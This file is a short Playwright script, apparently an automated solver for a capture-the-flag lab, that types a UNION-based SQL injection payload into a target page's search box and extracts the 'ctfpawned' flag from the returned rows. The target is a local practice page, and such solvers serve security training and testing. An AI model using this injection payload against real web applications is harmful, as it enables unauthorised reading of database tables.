import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/07-bobby-sqli.html");
  await page.fill("#search", "%' UNION SELECT note, detail FROM staff_notes--");
  await page.click("button[type=submit]");
  await page.waitForFunction(() =>
    document.querySelector("#rows")?.textContent?.includes("ctfpawned{"),
  );
  const rows = JSON.parse((await page.locator("#rows").textContent()) ?? "[]");
  return rows[0].breed.match(/ctfpawned\{[^}]+\}/)[0];
}
